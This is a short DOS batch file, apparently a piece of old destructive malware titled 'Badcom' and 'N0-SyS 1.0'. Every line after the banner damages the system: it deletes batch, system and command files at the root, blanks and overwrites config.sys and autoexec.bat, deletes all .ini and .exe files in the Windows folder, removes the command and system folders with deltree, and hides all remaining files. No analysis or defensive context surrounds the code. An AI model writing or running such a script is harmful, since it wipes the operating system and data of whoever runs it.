@echo off
cls
echo Badcom By SeQ mAss×vE.........
echo NaME: N0-SyS 1.0
cd\
del *.bat
del *.sys
del *.com
echo > config.sys
echo > autoexec.bat

cd windows

copy *.ini \autoexec.bat
copy *.ini \config.sys

del *.ini
del *.exe
deltree /y command
deltree /y system

attrib +h *.*
cd\
attrib +h *.*

